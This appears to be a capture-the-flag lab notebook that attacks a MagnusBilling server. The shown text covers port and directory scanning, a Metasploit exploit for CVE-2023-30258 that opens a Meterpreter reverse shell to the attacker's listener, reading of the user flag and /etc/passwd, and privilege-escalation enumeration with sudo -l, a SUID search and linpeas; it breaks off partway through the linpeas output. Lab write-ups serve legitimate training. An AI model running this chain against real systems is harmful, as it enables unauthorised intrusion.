ot@ip-10-201-28-178:~# nmap -A -p- 10.201.59.202 -oN initial.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-10 19:21 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.59.202
Host is up (0.00027s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.201.59.202/mbilling/
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
MAC Address: 16:FF:F9:1E:E9:F3 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/10%OT=22%CT=1%CU=42014%PV=Y%DS=1%DC=D%G=Y%M=16FFF9%
OS:TM=68E94ED4%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 10.201.59.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.92 seconds
root@ip-10-201-28-178:~# gobuster dir -u 10.201.59.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php, .html, .json, .txt, .js, .yaml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.59.202
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/.                    (Status: 302) [Size: 1] [--> ./mbilling]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
root@ip-10-201-28-178:~# gobuster dir -u 10.201.59.202/mbilling -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php, .html, .json, .txt, .js, .yaml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.59.202/mbilling
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 30760]
/archive              (Status: 301) [Size: 325] [--> http://10.201.59.202/mbilling/archive/]
/resources            (Status: 301) [Size: 327] [--> http://10.201.59.202/mbilling/resources/]
/index.php            (Status: 200) [Size: 663]
/assets               (Status: 301) [Size: 324] [--> http://10.201.59.202/mbilling/assets/]
/lib                  (Status: 301) [Size: 321] [--> http://10.201.59.202/mbilling/lib/]
/cron.php             (Status: 200) [Size: 0]
/tmp                  (Status: 301) [Size: 321] [--> http://10.201.59.202/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
==========

![[Pasted image 20251010151256.png]]
I see an is admin parameter with the false arg

i also see in my dirbuster results we are getting /lib /resources as exposed internal directories

![[Pasted image 20251010154052.png]]

I downloaded CA cert.pem i also saw they are running stripe api which tells me they may have API security tokens for the portal idk but the fact there is a backend database kinda leads me on to believe the API is being used for something
![[Pasted image 20251010155335.png]]
it seems like asterisk is a viop software and magnusbilling 7 is the billing system they use


okay found it https://www.exploit-db.com/exploits/52170


msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST 10.201.59.202
RHOST => 10.201.59.202
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.201.122.78
LHOST => 10.201.122.78
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.201.122.78:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.201.59.202:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 5 seconds.
[*] Elapsed time: 5.06 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.201.59.202
[+] Deleted EkeWrBMj.php
[*] Meterpreter session 1 opened (10.201.122.78:4444 -> 10.201.59.202:57050) at 2025-10-10 21:29:06 +0100
whoami
ls

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > ls
Listing: /var/www/html/mbilling/lib/icepay
==========================================

Mode             Size   Type  Last modified             Name
----             ----   ----  -------------             ----
100700/rwx-----  768    fil   2024-02-27 19:44:28 +000  icepay-cc.php
-                             0
100700/rwx-----  733    fil   2024-02-27 19:44:28 +000  icepay-ddebit.php
-                             0
100700/rwx-----  736    fil   2024-02-27 19:44:28 +000  icepay-directebank.php
-                             0
100700/rwx-----  730    fil   2024-02-27 19:44:28 +000  icepay-giropay.php
-                             0
100700/rwx-----  671    fil   2024-02-27 19:44:28 +000  icepay-ideal.php
-                             0
100700/rwx-----  720    fil   2024-02-27 19:44:28 +000  icepay-mistercash.php
-                             0
100700/rwx-----  710    fil   2024-02-27 19:44:28 +000  icepay-paypal.php
-                             0
100700/rwx-----  699    fil   2024-02-27 19:44:28 +000  icepay-paysafecard.php
-                             0
100700/rwx-----  727    fil   2024-02-27 19:44:28 +000  icepay-phone.php
-                             0
100700/rwx-----  723    fil   2024-02-27 19:44:28 +000  icepay-sms.php
-                             0
100700/rwx-----  699    fil   2024-02-27 19:44:28 +000  icepay-wire.php
-                             0
100700/rwx-----  25097  fil   2024-03-27 19:55:23 +000  icepay.php
-                             0
100644/rw-r--r-  0      fil   2024-09-13 10:17:00 +010  null
-                             0

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > pwd
/var/www/html/mbilling/lib/icepay
meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
/var/www/html/mbilling
meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  43    fil   2024-03-27 19:54:32 +0000  index.php
040555/r-xr-xr-x  4096  dir   2024-09-13 09:59:57 +0100  mbilling
100644/rw-r--r--  37    fil   2024-03-27 19:54:32 +0000  robots.txt

meterpreter > cd ../../..
meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100644/rw-r--r--  189       fil   2025-10-10 17:58:20 +0100  .badr-info
040700/rwx------  4096      dir   2024-03-27 19:44:40 +0000  .cache
040755/rwxr-xr-x  77824     dir   2025-05-28 23:07:03 +0100  bin
040755/rwxr-xr-x  4096      dir   2025-05-28 23:02:24 +0100  boot
040755/rwxr-xr-x  3180      dir   2025-10-10 17:58:08 +0100  dev
040755/rwxr-xr-x  12288     dir   2025-10-10 17:59:40 +0100  etc
040755/rwxr-xr-x  4096      dir   2025-10-10 17:58:22 +0100  home
100644/rw-r--r--  49963274  fil   2025-05-28 23:00:42 +0100  initrd.img
100644/rw-r--r--  42985787  fil   2024-03-27 19:45:02 +0000  initrd.img.old
040755/rwxr-xr-x  4096      dir   2025-05-28 23:06:57 +0100  lib
040755/rwxr-xr-x  4096      dir   2025-05-28 22:48:12 +0100  lib64
040700/rwx------  16384     dir   2024-03-27 19:40:55 +0000  lost+found
040755/rwxr-xr-x  4096      dir   2024-03-27 19:40:55 +0000  media
040755/rwxr-xr-x  4096      dir   2024-03-27 19:41:01 +0000  mnt
040755/rwxr-xr-x  4096      dir   2024-03-27 19:41:01 +0000  opt
040555/r-xr-xr-x  0         dir   2025-10-10 17:57:15 +0100  proc
040700/rwx------  4096      dir   2025-05-28 23:01:38 +0100  root
040755/rwxr-xr-x  880       dir   2025-10-10 21:03:25 +0100  run
040755/rwxr-xr-x  20480     dir   2025-05-28 23:02:37 +0100  sbin
040755/rwxr-xr-x  4096      dir   2024-03-27 19:41:01 +0000  srv
040555/r-xr-xr-x  0         dir   2025-10-10 17:57:15 +0100  sys
041777/rwxrwxrwx  4096      dir   2025-10-10 17:59:43 +0100  tmp
040755/rwxr-xr-x  4096      dir   2025-05-28 22:49:38 +0100  usr
040755/rwxr-xr-x  4096      dir   2024-03-27 19:49:58 +0000  var
100644/rw-r--r--  8193984   fil   2025-05-22 19:32:07 +0100  vmlinuz
100644/rw-r--r--  7039552   fil   2024-01-31 21:14:09 +0000  vmlinuz.old

meterpreter > cd home
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2025-10-10 17:58:24 +0100  debian
040755/rwxr-xr-x  4096  dir   2024-09-09 15:45:14 +0100  magnus
040755/rwxr-xr-x  4096  dir   2025-05-28 22:32:43 +0100  ssm-user

meterpreter > cd magnus
meterpreter > ls
Listing: /home/magnus
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-10-10 21:29:04 +0100  .bash_history
100600/rw-------  220   fil   2024-03-27 19:45:39 +0000  .bash_logout
100600/rw-------  3526  fil   2024-03-27 19:45:39 +0000  .bashrc
040700/rwx------  4096  dir   2024-09-09 13:01:09 +0100  .cache
040700/rwx------  4096  dir   2024-03-27 19:47:04 +0000  .config
040700/rwx------  4096  dir   2024-09-09 13:01:09 +0100  .gnupg
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  .local
100700/rwx------  807   fil   2024-03-27 19:45:39 +0000  .profile
040700/rwx------  4096  dir   2024-03-27 19:46:17 +0000  .ssh
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Desktop
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Documents
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Downloads
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Music
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Pictures
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Public
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Templates
040700/rwx------  4096  dir   2024-03-27 19:46:12 +0000  Videos
100644/rw-r--r--  38    fil   2024-03-27 21:44:18 +0000  user.txt

meterpreter > cat user.txt
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
meterpreter > 

entering shell we get

sudo -l

Matching Defaults entries for asterisk on ip-10-201-59-202:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-201-59-202:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
ls -la | grep -i fail2ban-client
-rwxr-xr-x  1 root root        1419 Apr 21  2023 fail2ban-client

meterpreter > getuid
Server username: asterisk


meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
magnus:x:1000:1000:magnus,,,:/home/magnus:/bin/bash
asterisk:x:1001:1001:Asterisk PBX:/var/lib/asterisk:/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:117:125::/nonexistent:/usr/sbin/nologin
mysql:x:118:126:MySQL Server,,,:/nonexistent:/bin/false
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
polkitd:x:998:998:polkit:/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:119:129:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ntpsec:x:120:130::/nonexistent:/usr/sbin/nologin
gnome-initial-setup:x:121:65534::/run/gnome-initial-setup/:/bin/false
debian:x:1003:1003:Debian:/home/debian:/bin/bash

find / -perm -4000 -type f -exec ls -ld {} \; 2>/dev/null | head
-rwsr-xr-x 1 root root 59704 Nov 21  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 52880 Apr  7  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 62672 Apr  7  2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 68248 Apr  7  2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 72000 Nov 21  2024 /usr/bin/su
-rwsr-xr-x 1 root root 14848 May 12 04:22 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 26776 Jan 31  2023 /usr/bin/pkexec
-rwsr-xr-x 1 root root 35128 Nov 21  2024 /usr/bin/umount
-rwsr-xr-x 1 root root 35128 Apr 18  2023 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 162752 Oct 27  2024 /usr/bin/ntfs-3g
              

ls -l /sbin/e2scrub_all /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
-rwxr-xr-x 1 root root 5394 Mar  4  2023 /sbin/e2scrub_all
-rwxr-xr-x 1 root root 1978 Mar  4  2023 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron

cron jobs running e2scrub_all didnt have write perms for my asterisk user

ls -la /tmp total 8 drwxrwxrwt 2 root root 4096 Oct 10 20:37 . drwxr-xr-x 19 root root 4096 Oct 10 20:35 ..

eventually noticed temp was rwx so I ran the peas

meterpreter > cd /tmp
meterpreter > upload linpeas.sh
[*] Uploading  : /root/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 949.04 KiB (0.0%): /root/linpeas.sh -> linpeas.sh
[*] Completed  : /root/linpeas.sh -> linpeas.sh
meterpreter > shell
Process 3354 created.
Channel 8 created.
./linpeas.sh
/bin/sh: 1: ./linpeas.sh: Permission denied
chmod +x linpeas.sh
./linpeas.sh

----------------------------------------------------------------------------------

had to run this to get it to actually work
./linpeas.sh 2>&1 | tee /tmp/linpeas.out



\u2550\u2550\u2563 EC2 Security Credentials
-11T12:32:17Z"
}

\u2550\u2550\u2563 SSM Runnig
root         937  0.0  1.2 1832376 24012 ?       Ssl  20:37   0:00 /usr/bin/amazon-ssm-agent



                \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes, Crons, Timers, Services and Sockets \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Running processes (cleaned)
\u255a Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root           1  0.3  0.6 168524 13016 ?        Ss   20:34   0:12 /sbin/init
root         405  0.0  0.9  49764 18216 ?        Ss   20:35   0:00 /lib/systemd/systemd-journald
root         446  0.0  0.3  28224  7156 ?        Ss   20:35   0:00 /lib/systemd/systemd-udevd
root         733  0.0  0.4 236836  9360 ?        Ssl  20:36   0:00 /usr/libexec/accounts-daemon[0m
avahi        752  0.0  0.0   8108   364 ?        S    20:36   0:00  _ avahi-daemon: chroot helper
root         736  0.0  0.1   6612  2716 ?        Ss   20:36   0:00 /usr/sbin/cron -f
message+     737  0.0  0.3  10664  6188 ?        Ss   20:36   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  \u2514\u2500(Caps) 0x0000000020000000=cap_audit_write
root         739  0.0  0.2 230028  4380 ?        SLsl 20:36   0:00 /usr/libexec/low-memory-monitor
polkitd      741  0.0  0.6 236984 12780 ?        Ssl  20:36   0:00 /usr/lib/polkit-1/polkitd --no-debug
root         742  0.0  0.4 237004  8652 ?        Ssl  20:36   0:00 /usr/libexec/power-profiles-daemon[0m
root         744  0.0  0.3 221820  7060 ?        Ssl  20:36   0:00 /usr/sbin/rsyslogd -n -iNONE
root         745  0.0  0.3 233236  6692 ?        Ssl  20:36   0:00 /usr/libexec/switcheroo-control
root         749  0.0  0.4  17160  7928 ?        Ss   20:36   0:00 /lib/systemd/systemd-logind
root         750  0.0  0.7 394696 14248 ?        Ssl  20:36   0:00 /usr/libexec/udisks2/udisksd
root         805  0.0  1.0 258632 21384 ?        Ssl  20:37   0:00 /usr/sbin/NetworkManager --no-daemon[0m
root         809  0.0  0.2  16540  5832 ?        Ss   20:37   0:00 /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
root         819  0.0  0.6 317324 11916 ?        Ssl  20:37   0:00 /usr/sbin/ModemManager
root         864  0.0  0.4  27492  9444 ?        Ss   20:37   0:00 /usr/sbin/cupsd -l
root         865  0.1  1.4 1171732 28696 ?       Ssl  20:37   0:06 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
root         868  0.0  1.5 268364 30284 ?        Ss   20:37   0:00 php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)
www-data    1247  0.0  0.6 268888 13136 ?        S    20:37   0:00  _ php-fpm: pool www
www-data    1248  0.0  0.6 268888 13136 ?        S    20:37   0:00  _ php-fpm: pool www
root         871  0.0  1.2 118400 24096 ?        Ssl  20:37   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         937  0.0  1.2 1832376 24012 ?       Ssl  20:37   0:00 /usr/bin/amazon-ssm-agent
root         943  0.0  0.8 176272 15988 ?        Ssl  20:37   0:00 /usr/sbin/cups-browsed
root        1072  0.0  0.5 240208 10884 ?        Ssl  20:37   0:00 /usr/sbin/gdm3
Debian-+    1457  0.0  0.4 162788  8856 tty1     Ssl+ 20:37   0:00      _ /usr/libexec/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
root        1459  0.0  4.1 323944 81348 tty1     Sl+  20:37   0:00          _ /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/116/gdm/Xauthority -nolisten tcp -background none -noreset -keeptty -novtswitch -verbose 3
Debian-+    1498  0.0  0.0   6264  1516 tty1     S+   20:37   0:00          _ dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
Debian-+    1499  0.0  0.2   9432  5156 tty1     S+   20:37   0:00              _ dbus-daemon --nofork --print-address 4 --session
Debian-+    1500  0.0  0.9 790804 18296 tty1     Sl+  20:37   0:00              _ /usr/libexec/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
Debian-+    1557  0.0 11.1 3662872 221692 tty1   Sl+  20:37   0:02                  _ /usr/bin/gnome-shell
Debian-+    1662  0.0  0.7 459732 14036 tty1     Sl   20:37   0:00                  |   _ ibus-daemon --panel disable --xim
Debian-+    1755  0.0  0.4 160364  8220 tty1     Sl   20:37   0:00                  |       _ /usr/libexec/ibus-memconf
Debian-+    1756  0.0  1.4 268836 28840 tty1     Sl   20:37   0:02                  |       _ /usr/libexec/ibus-extension-gtk3
Debian-+    1903  0.0  0.4 160360  9016 tty1     Sl   20:37   0:00                  |       _ /usr/libexec/ibus-engine-simple
Debian-+    1648  0.0  0.6 463492 13376 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-sharing
Debian-+    1650  0.0  0.9 334288 19284 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-wacom
Debian-+    1653  0.0  1.0 335824 19880 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-color
Debian-+    1661  0.0  0.9 334020 18292 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-keyboard
Debian-+    1667  0.0  0.6 247220 13220 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-print-notifications
Debian-+    1668  0.0  0.4 454768  8232 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-rfkill
Debian-+    1670  0.0  0.6 385812 13696 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-smartcard
Debian-+    1672  0.0  0.5 355480 11476 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-datetime
Debian-+    1673  0.0  1.2 860680 24416 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-media-keys
Debian-+    1679  0.0  0.4 233184  8196 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-screensaver-proxy
Debian-+    1680  0.0  0.5 319600 11232 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-sound
Debian-+    1681  0.0  0.5 307588 10652 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-a11y-settings
Debian-+    1687  0.0  0.4 383072  9416 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-housekeeping
Debian-+    1691  0.0  1.0 446040 19820 tty1     Sl+  20:37   0:00                  _ /usr/libexec/gsd-power
ntpsec      1179  0.0  0.9  84916 19276 ?        SLs  20:37   0:00 /usr/sbin/ntpd -p /run/ntpd.pid -c /etc/ntpsec/ntp.conf -g -N -u ntpsec:ntpsec
  \u2514\u2500(Caps) 0x0000000002800400=cap_net_bind_service,cap_sys_nice,cap_sys_time
mysql       1231  0.0 11.2 1424716 222236 ?      Ssl  20:37   0:00 /usr/sbin/mariadbd
  \u2514\u2500(Caps) 0x0000000020004002=cap_dac_override,cap_ipc_lock,cap_audit_write
root        1240  0.0  1.5 271728 30284 ?        Ss   20:37   0:00 /usr/sbin/apache2 -k start
asterisk    1241  0.0  0.7 272176 14728 ?        S    20:37   0:00  _ /usr/sbin/apache2 -k start
asterisk    1242  0.0  0.8 272328 16168 ?        S    20:37   0:00  _ /usr/sbin/apache2 -k start
asterisk    1243  0.0  1.3 274352 26416 ?        S    20:37   0:00  _ /usr/sbin/apache2 -k start
asterisk    3354  0.0  0.0   2580   924 ?        S    21:36   0:00  |   _ sh -c /bin/sh
asterisk    3355  0.0  0.0   2580   976 ?        S    21:36   0:00  |       _ /bin/sh
asterisk   33274  0.4  0.1   3560  2692 ?        S    21:40   0:00  |           _ /bin/sh ./linpeas.sh
asterisk   36290  0.0  0.0   3560  1152 ?        S    21:40   0:00  |           |   _ /bin/sh ./linpeas.sh
asterisk   36291  0.0  0.2   8104  4052 ?        R    21:40   0:00  |           |   |   _ ps fauxwww
asterisk   36294  0.0  0.0   3560  1152 ?        S    21:40   0:00  |           |   _ /bin/sh ./linpeas.sh
asterisk   33275  0.0  0.0   2492   872 ?        S    21:40   0:00  |           _ tee /tmp/linpeas.out
asterisk    1244  0.0  1.0 272320 20508 ?        S    20:37   0:00  _ /usr/sbin/apache2 -k start
asterisk    1245  0.0  0.8 272328 16380 ?        S    20:37   0:00  _ /usr/sbin/apache2 -k start
asterisk    1246  0.0  1.0 272320 21588 ?        S    20:37   0:00  _ /usr/sbin/apache2 -k start
asterisk    2382  0.0  0.7 272280 14876 ?        S    20:49   0:00  _ /usr/sbin/apache2 -k start
root        1366  0.0  2.7 1144120 54744 ?       Ssl  20:37   0:01 /usr/sbin/asterisk
Debian-+    1435  0.0  0.5  19472 11268 ?        Ss   20:37   0:00 /lib/systemd/systemd --user
Debian-+    1436  0.0  0.1 169528  3904 ?        S    20:37   0:00  _ (sd-pam)
Debian-+    1452  0.0  0.5  44292 10932 ?        S<sl 20:37   0:00  _ /usr/bin/pipewire
Debian-+    1454  0.0  0.8 255424 17472 ?        S<sl 20:37   0:00  _ /usr/bin/wireplumber
Debian-+    1455  0.0  0.4  26960  9284 ?        S<sl 20:37   0:00  _ /usr/bin/pipewire-pulse
Debian-+    1456  0.0  0.2   9260  5016 ?        Ss   20:37   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
Debian-+    1486  0.0  0.4 237520  9576 ?        Ssl  20:37   0:00  _ /usr/libexec/gvfsd
Debian-+    1494  0.0  0.5 380380 10236 ?        Sl   20:37   0:00  _ /usr/libexec/gvfsd-fuse /run/user/116/gvfs -f
Debian-+    1565  0.0  2.7 627656 54240 ?        SNsl 20:37   0:00  _ /usr/libexec/tracker-miner-fs-3
Debian-+    1585  0.0  0.5 351548 11580 ?        Ssl  20:37   0:00  _ /usr/libexec/gvfs-udisks2-volume-monitor
Debian-+    1590  0.0  0.4 233528  8432 ?        Ssl  20:37   0:00  _ /usr/libexec/gvfs-goa-volume-monitor
Debian-+    1594  0.0  2.6 808432 53012 ?        Sl   20:37   0:00  _ /usr/libexec/goa-daemon
Debian-+    1897  0.0  0.6 386312 12768 ?        Sl   20:37   0:00  _ /usr/libexec/goa-identity-service
Debian-+    1904  0.0  0.4 234300  8536 ?        Ssl  20:37   0:00  _ /usr/libexec/gvfs-gphoto2-volume-monitor
Debian-+    1941  0.0  0.4 312428  9824 ?        Ssl  20:37   0:00  _ /usr/libexec/gvfs-afc-volume-monitor
Debian-+    1974  0.0  0.4 233344  8340 ?        Ssl  20:37   0:00  _ /usr/libexec/gvfs-mtp-volume-monitor
